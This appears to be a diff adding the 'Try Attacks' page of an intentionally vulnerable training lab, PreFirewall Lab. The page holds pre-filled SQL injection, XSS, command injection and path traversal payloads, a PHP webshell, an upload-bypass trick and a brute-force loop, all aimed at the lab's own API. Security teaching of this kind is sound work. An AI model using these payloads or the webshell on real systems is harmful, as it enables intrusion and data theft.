@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interactive Attacks - PreFirewall Lab</title>
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <!-- Warning Banner -->
+    <div class="warning-banner">
+        ⚠️ INTENTIONALLY VULNERABLE APPLICATION - LAB USE ONLY ⚠️
+    </div>
+
+    <!-- Header -->
+    <header>
+        <div class="header-content">
+            <div class="logo">
+                <span class="logo-icon">🔥</span>
+                <div>
+                    <h1>PreFirewall Lab</h1>
+                    <p class="tagline">Interactive Attack Interface</p>
+                </div>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="/">Home</a></li>
+                    <li><a href="/demos/dashboard.html">Dashboard</a></li>
+                    <li><a href="/demos/attacks.html">Try Attacks</a></li>
+                    <li><a href="/demos/quickstart.html">Quick Start</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <div class="demo-container">
+        <div class="demo-header">
+            <h1>🎯 Try Vulnerabilities Interactively</h1>
+            <p style="color: var(--text-muted);">
+                Select an attack category below and execute real vulnerabilities against PreFirewall Lab.
+                Each attack includes pre-filled payloads and detailed explanations.
+            </p>
+        </div>
+
+        <!-- Attack Categories Tabs -->
+        <div class="demo-section">
+            <div style="display: flex; gap: 1rem; flex-wrap: wrap; margin-bottom: 2rem;">
+                <button class="btn btn-primary" onclick="showCategory('sql')">💉 SQL Injection</button>
+                <button class="btn btn-secondary" onclick="showCategory('xss')">🔴 XSS</button>
+                <button class="btn btn-secondary" onclick="showCategory('command')">⚡ Command Injection</button>
+                <button class="btn btn-secondary" onclick="showCategory('traversal')">📁 Path Traversal</button>
+                <button class="btn btn-secondary" onclick="showCategory('upload')">📤 File Upload</button>
+                <button class="btn btn-secondary" onclick="showCategory('brute')">🔓 Brute Force</button>
+            </div>
+
+            <!-- SQL Injection Category -->
+            <div id="sql-category" class="attack-category">
+                <h2>💉 SQL Injection Attacks</h2>
+                <p class="text-muted">
+                    Direct string concatenation into SQL queries with zero validation.
+                    Firewalls detect SQL keywords (UNION, SELECT, OR) and comment patterns.
+                </p>
+
+                <!-- Attack 1: Classic OR Bypass -->
+                <div class="demo-section mt-3">
+                    <h3>Attack 1: Classic OR Bypass</h3>
+                    <p>Bypass authentication using <code>OR '1'='1'</code> to make the WHERE clause always true.</p>
+                    
+                    <div class="form-group">
+                        <label>Username:</label>
+                        <input type="text" id="sql-username" value="admin' OR '1'='1" class="demo-input">
+                    </div>
+
+                    <button class="btn btn-primary" onclick="testSQLBypass()">
+                        🚀 Execute Attack
+                    </button>
+
+                    <div class="alert alert-warning mt-2">
+                        <strong>Expected Result:</strong> Returns ALL users including passwords, SSNs, and credit cards.
+                        Without firewall, this succeeds instantly.
+                    </div>
+
+                    <div id="sql-bypass-result" class="response-box mt-2" style="display:none;"></div>
+                </div>
+
+                <!-- Attack 2: Comment Injection -->
+                <div class="demo-section mt-3">
+                    <h3>Attack 2: Comment Injection Login</h3>
+                    <p>Use SQL comment <code>--</code> to bypass password check entirely.</p>
+                    
+                    <div class="form-group">
+                        <label>Username:</label>
+                        <input type="text" id="login-username" value="admin' --">
+                    </div>
+                    <div class="form-group">
+                        <label>Password:</label>
+                        <input type="password" id="login-password" value="anything">
+                    </div>
+
+                    <button class="btn btn-primary" onclick="testSQLLogin()">
+                        🚀 Execute Attack
+                    </button>
+
+                    <div class="alert alert-warning mt-2">
+                        <strong>Expected Result:</strong> Login succeeds with any password because the comment removes the password check.
+                    </div>
+
+                    <div id="sql-login-result" class="response-box mt-2" style="display:none;"></div>
+                </div>
+
+                <!-- Attack 3: UNION-based Extraction -->
+                <div class="demo-section mt-3">
+                    <h3>Attack 3: UNION-Based Data Extraction</h3>
+                    <p>Extract user credentials through product search using UNION SELECT.</p>
+                    
+                    <div class="form-group">
+                        <label>Product ID:</label>
+                        <input type="text" id="union-id" value="1 UNION SELECT id,username,password,email FROM users--" style="width: 100%;">
+                    </div>
+
+                    <button class="btn btn-primary" onclick="testSQLUnion()">
+                        🚀 Execute Attack
+                    </button>
+
+                    <div class="alert alert-warning mt-2">
+                        <strong>Expected Result:</strong> Product query returns user table data instead, exposing all credentials.
+                    </div>
+
+                    <div id="sql-union-result" class="response-box mt-2" style="display:none;"></div>
+                </div>
+            </div>
+
+            <!-- XSS Category -->
+            <div id="xss-category" class="attack-category" style="display:none;">
+                <h2>🔴 Cross-Site Scripting (XSS) Attacks</h2>
+                <p class="text-muted">
+                    No input sanitization or output encoding. JavaScript executes directly in responses.
+                    Firewalls detect &lt;script&gt; tags and event handlers.
+                </p>
+
+                <div class="demo-section mt-3">
+                    <h3>Reflected XSS - Script Tag</h3>
+                    <p>Inject JavaScript that executes immediately in the response.</p>
+                    
+                    <div class="form-group">
+                        <label>Search Query:</label>
+                        <input type="text" id="xss-search" value="<script>alert('XSS Vulnerability!')</script>">
+                    </div>
+
+                    <button class="btn btn-primary" onclick="testXSSReflected()">
+                        🚀 Execute Attack
+                    </button>
+
+                    <div class="alert alert-warning mt-2">
+                        <strong>Expected Result:</strong> JavaScript alert box appears. In production, this could steal cookies or session tokens.
+                    </div>
+
+                    <div id="xss-reflected-result" class="response-box mt-2" style="display:none;"></div>
+                </div>
+
+                <div class="demo-section mt-3">
+                    <h3>Stored XSS - Comment Injection</h3>
+                    <p>Store malicious script in database that executes for all users viewing the page.</p>
+                    
+                    <div class="form-group">
+                        <label>Username:</label>
+                        <input type="text" id="xss-username" value="Attacker">
+                    </div>
+                    <div class="form-group">
+                        <label>Comment:</label>
+                        <textarea id="xss-comment" rows="3"><script>alert('Stored XSS - Everyone sees this!')</script></textarea>
+                    </div>
+
+                    <button class="btn btn-primary" onclick="testXSSStored()">
+                        🚀 Execute Attack
+                    </button>
+
+                    <button class="btn btn-secondary mt-2" onclick="viewXSSComments()">
+                        👁️ View Comments (Trigger XSS)
+                    </button>
+
+                    <div class="alert alert-warning mt-2">
+                        <strong>Expected Result:</strong> Script is saved to database and executes when anyone views comments.
+                    </div>
+
+                    <div id="xss-stored-result" class="response-box mt-2" style="display:none;"></div>
+                </div>
+            </div>
+
+            <!-- Command Injection Category -->
+            <div id="command-category" class="attack-category" style="display:none;">
+                <h2>⚡ Command Injection Attacks</h2>
+                <p class="text-muted">
+                    Direct execution of user input in system commands. No sanitization of shell metacharacters.
+                    Firewalls detect semicolons, pipes, and command patterns.
+                </p>
+
+                <div class="demo-section mt-3">
+                    <h3>Semicolon Command Chaining</h3>
+                    <p>Use semicolon to execute multiple commands sequentially.</p>
+                    
+                    <div class="form-group">
+                        <label>Host to Ping:</label>
+                        <input type="text" id="cmd-host" value="127.0.0.1; whoami">
+                    </div>
+
+                    <button class="btn btn-primary" onclick="testCommandInjection()">
+                        🚀 Execute Attack
+                    </button>
+
+                    <div class="alert alert-warning mt-2">
+                        <strong>Expected Result:</strong> Both ping and whoami commands execute. Shows current user.
+                    </div>
+
+                    <div id="cmd-result" class="response-box mt-2" style="display:none;"></div>
+                </div>
+            </div>
+
+            <!-- Path Traversal Category -->
+            <div id="traversal-category" class="attack-category" style="display:none;">
+                <h2>📁 Path Traversal Attacks</h2>
+                <p class="text-muted">
+                    No path validation or sanitization. Can access any file the server has permissions to read.
+                    Firewalls detect ../ patterns and encoded variations.
+                </p>
+
+                <div class="demo-section mt-3">
+                    <h3>Directory Traversal - Read /etc/passwd</h3>
+                    <p>Use ../ sequences to navigate outside intended directory.</p>
+                    
+                    <div class="form-group">
+                        <label>Filename:</label>
+                        <input type="text" id="traversal-file" value="../../../../etc/passwd">
+                    </div>
+
+                    <button class="btn btn-primary" onclick="testPathTraversal()">
+                        🚀 Execute Attack
+                    </button>
+
+                    <div class="alert alert-warning mt-2">
+                        <strong>Expected Result:</strong> Contents of /etc/passwd displayed (or error if on Windows).
+                    </div>
+
+                    <div id="traversal-result" class="response-box mt-2" style="display:none;"></div>
+                </div>
+            </div>
+
+            <!-- File Upload Category -->
+            <div id="upload-category" class="attack-category" style="display:none;">
+                <h2>📤 Insecure File Upload Attacks</h2>
+                <p class="text-muted">
+                    No file type validation, no size limits, no content inspection. Upload any file type anywhere.
+                    Firewalls detect malicious file extensions and content patterns.
+                </p>
+
+                <div class="demo-section mt-3">
+                    <h3>Attack 1: Unrestricted File Upload</h3>
+                    <p>Upload a PHP webshell or executable file with no restrictions.</p>
+                    
+                    <div class="form-group">
+                        <label>Choose File:</label>
+                        <input type="file" id="upload-file-1" class="demo-input">
+                    </div>
+
+                    <button class="btn btn-primary" onclick="testUnrestrictedUpload()">
+                        🚀 Upload File
+                    </button>
+
+                    <div class="alert alert-warning mt-2">
+                        <strong>Expected Result:</strong> Any file type accepted. Could upload .php, .exe, .sh files.
+                    </div>
+
+                    <div id="upload-unrestricted-result" class="response-box mt-2" style="display:none;"></div>
+                </div>
+
+                <div class="demo-section mt-3">
+                    <h3>Attack 2: Create Malicious Test File</h3>
+                    <p>Create a simulated webshell file to upload.</p>
+                    
+                    <div class="form-group">
+                        <label>Filename:</label>
+                        <input type="text" id="webshell-filename" value="shell.php" class="demo-input">
+                    </div>
+                    <div class="form-group">
+                        <label>Content:</label>
+                        <textarea id="webshell-content" rows="4" class="demo-input"><?php
+// Webshell - Execute any command
+system($_GET['cmd']);
+?></textarea>
+                    </div>
+
+                    <button class="btn btn-primary" onclick="createAndUploadWebshell()">
+                        🚀 Create & Upload Webshell
+                    </button>
+
+                    <div class="alert alert-danger mt-2">
+                        <strong>Danger:</strong> This creates a file that allows remote code execution. 
+                        Firewalls block .php uploads and detect malicious patterns.
+                    </div>
+
+                    <div id="upload-webshell-result" class="response-box mt-2" style="display:none;"></div>
+                </div>
+
+                <div class="demo-section mt-3">
+                    <h3>Attack 3: Double Extension Bypass</h3>
+                    <p>Try to bypass basic filters using double extensions like .php.jpg</p>
+                    
+                    <div class="form-group">
+                        <label>Choose File (rename to .php.jpg):</label>
+                        <input type="file" id="upload-file-2" class="demo-input">
+                    </div>
+
+                    <button class="btn btn-primary" onclick="testDoubleExtension()">
+                        🚀 Upload with Double Extension
+                    </button>
+
+                    <div class="alert alert-warning mt-2">
+                        <strong>Expected Result:</strong> File accepted. Some servers execute this as PHP despite .jpg ending.
+                    </div>
+
+                    <div id="upload-double-result" class="response-box mt-2" style="display:none;"></div>
+                </div>
+            </div>
+
+            <!-- Brute Force Category -->
+            <div id="brute-category" class="attack-category" style="display:none;">
+                <h2>🔓 Brute Force Attacks</h2>
+                <p class="text-muted">
+                    No rate limiting, no account lockout, no CAPTCHA. Unlimited attempts allowed.
+                    Firewalls detect high request rates and block aggressive IPs.
+                </p>
+
+                <div class="demo-section mt-3">
+                    <h3>Unlimited Login Attempts</h3>
+                    <p>Try multiple passwords without any rate limiting or lockout.</p>
+                    
+                    <div class="form-group">
+                        <label>Username:</label>
+                        <input type="text" id="brute-username" value="admin">
+                    </div>
+                    <div class="form-group">
+                        <label>Password:</label>
+                        <input type="password" id="brute-password" value="wrongpassword">
+                    </div>
+
+                    <button class="btn btn-primary" onclick="testBruteForce()">
+                        🚀 Single Attempt
+                    </button>
+                    <button class="btn btn-secondary" onclick="testBruteForceMultiple()">
+                        🔄 Try 10 Rapid Attempts
+                    </button>
+
+                    <div class="alert alert-warning mt-2">
+                        <strong>Expected Result:</strong> All attempts are processed. No blocking or rate limiting occurs.
+                    </div>
+
+                    <div id="brute-result" class="response-box mt-2" style="display:none;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p><strong>PreFirewall Lab - Interactive Attack Interface</strong></p>
+        <p style="color: var(--danger);">⚠️ For Educational Purposes Only</p>
+    </footer>
+
+    <script src="/js/app.js"></script>
+    <script>
+        // Show/hide attack categories
+        function showCategory(category) {
+            // Hide all categories
+            document.querySelectorAll('.attack-category').forEach(cat => {
+                cat.style.display = 'none';
+            });
+            
+            // Show selected category
+            document.getElementById(category + '-category').style.display = 'block';
+            
+            // Update button styles
+            document.querySelectorAll('.demo-section > div > button').forEach(btn => {
+                btn.className = 'btn btn-secondary';
+            });
+            event.target.className = 'btn btn-primary';
+        }
+
+        // SQL Injection Attacks
+        async function testSQLBypass() {
+            const username = document.getElementById('sql-username').value;
+            showLoading('sql-bypass-result');
+            document.getElementById('sql-bypass-result').style.display = 'block';
+            
+            const result = await makeAPICall(`/api/sql/users?username=${encodeURIComponent(username)}`);
+            displayResult('sql-bypass-result', result.data || result.error, !result.success);
+        }
+
+        async function testSQLLogin() {
+            const username = document.getElementById('login-username').value;
+            const password = document.getElementById('login-password').value;
+            showLoading('sql-login-result');
+            document.getElementById('sql-login-result').style.display = 'block';
+            
+            const result = await makeAPICall('/api/sql/login', 'POST', { username, password });
+            displayResult('sql-login-result', result.data || result.error, !result.success);
+        }
+
+        async function testSQLUnion() {
+            const id = document.getElementById('union-id').value;
+            showLoading('sql-union-result');
+            document.getElementById('sql-union-result').style.display = 'block';
+            
+            const result = await makeAPICall(`/api/sql/products?id=${encodeURIComponent(id)}`);
+            displayResult('sql-union-result', result.data || result.error, !result.success);
+        }
+
+        // XSS Attacks
+        async function testXSSReflected() {
+            const query = document.getElementById('xss-search').value;
+            showLoading('xss-reflected-result');
+            document.getElementById('xss-reflected-result').style.display = 'block';
+            
+            const response = await fetch(`/api/xss/greet?name=${encodeURIComponent(query)}`);
+            const data = await response.json();
+            
+            displayResult('xss-reflected-result', data);
+            
+            if (data.html) {
+                showNotification('XSS payload returned in response! Check the JSON.', 'warning');
+            }
+        }
+
+        async function testXSSStored() {
+            const username = document.getElementById('xss-username').value;
+            const comment = document.getElementById('xss-comment').value;
+            showLoading('xss-stored-result');
+            document.getElementById('xss-stored-result').style.display = 'block';
+            
+            const result = await makeAPICall('/api/xss/comment', 'POST', { username, comment });
+            displayResult('xss-stored-result', result.data || result.error, !result.success);
+            
+            if (result.success) {
+                showNotification('Malicious script stored! Click "View Comments" to trigger it.', 'warning');
+            }
+        }
+
+        function viewXSSComments() {
+            window.open('/api/xss/comments', '_blank');
+        }
+
+        // Command Injection
+        async function testCommandInjection() {
+            const host = document.getElementById('cmd-host').value;
+            showLoading('cmd-result');
+            document.getElementById('cmd-result').style.display = 'block';
+            
+            const result = await makeAPICall('/api/command/ping', 'POST', { host });
+            displayResult('cmd-result', result.data || result.error, !result.success);
+        }
+
+        // Path Traversal
+        async function testPathTraversal() {
+            const file = document.getElementById('traversal-file').value;
+            showLoading('traversal-result');
+            document.getElementById('traversal-result').style.display = 'block';
+            
+            const result = await makeAPICall(`/api/traversal/download?file=${encodeURIComponent(file)}`);
+            displayResult('traversal-result', result.data || result.error, !result.success);
+        }
+
+        // File Upload Attacks
+        async function testUnrestrictedUpload() {
+            const fileInput = document.getElementById('upload-file-1');
+            if (!fileInput.files[0]) {
+                showNotification('Please select a file first', 'warning');
+                return;
+            }
+
+            showLoading('upload-unrestricted-result');
+            document.getElementById('upload-unrestricted-result').style.display = 'block';
+
+            const formData = new FormData();
+            formData.append('file', fileInput.files[0]);
+
+            try {
+                const response = await fetch('/api/upload/unrestricted', {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                displayResult('upload-unrestricted-result', result);
+                
+                if (result.success) {
+                    showNotification('File uploaded successfully! No restrictions enforced.', 'warning');
+                }
+            } catch (error) {
+                displayResult('upload-unrestricted-result', { error: error.message }, true);
+            }
+        }
+
+        async function createAndUploadWebshell() {
+            const filename = document.getElementById('webshell-filename').value;
+            const content = document.getElementById('webshell-content').value;
+
+            showLoading('upload-webshell-result');
+            document.getElementById('upload-webshell-result').style.display = 'block';
+
+            // Create a blob from the content
+            const blob = new Blob([content], { type: 'text/plain' });
+            const file = new File([blob], filename, { type: 'application/x-php' });
+
+            const formData = new FormData();
+            formData.append('file', file);
+
+            try {
+                const response = await fetch('/api/upload/unrestricted', {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                displayResult('upload-webshell-result', result);
+                
+                if (result.success) {
+                    showNotification('⚠️ Webshell uploaded! This demonstrates RCE vulnerability.', 'danger');
+                }
+            } catch (error) {
+                displayResult('upload-webshell-result', { error: error.message }, true);
+            }
+        }
+
+        async function testDoubleExtension() {
+            const fileInput = document.getElementById('upload-file-2');
+            if (!fileInput.files[0]) {
+                showNotification('Please select a file first', 'warning');
+                return;
+            }
+
+            showLoading('upload-double-result');
+            document.getElementById('upload-double-result').style.display = 'block';
+
+            const formData = new FormData();
+            formData.append('file', fileInput.files[0]);
+
+            try {
+                const response = await fetch('/api/upload/unrestricted', {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                displayResult('upload-double-result', result);
+                
+                if (result.success) {
+                    showNotification('File with double extension accepted!', 'warning');
+                }
+            } catch (error) {
+                displayResult('upload-double-result', { error: error.message }, true);
+            }
+        }
+
+        // Brute Force
+        async function testBruteForce() {
+            const username = document.getElementById('brute-username').value;
+            const password = document.getElementById('brute-password').value;
+            showLoading('brute-result');
+            document.getElementById('brute-result').style.display = 'block';
+            
+            const result = await makeAPICall('/api/brute/login', 'POST', { username, password });
+            displayResult('brute-result', result.data || result.error, !result.success);
+        }
+
+        async function testBruteForceMultiple() {
+            const username = document.getElementById('brute-username').value;
+            showLoading('brute-result');
+            document.getElementById('brute-result').style.display = 'block';
+            
+            let results = [];
+            for (let i = 1; i <= 10; i++) {
+                const result = await makeAPICall('/api/brute/login', 'POST', { 
+                    username, 
+                    password: 'attempt' + i 
+                });
+                results.push(`Attempt ${i}: ${result.success ? 'Processed' : 'Error'}`);
+            }
+            
+            displayResult('brute-result', {
+                message: 'Completed 10 rapid login attempts',
+                results: results,
+                note: 'All attempts were processed without rate limiting!'
+            });
+        }
+    </script>
+</body>
+</html>
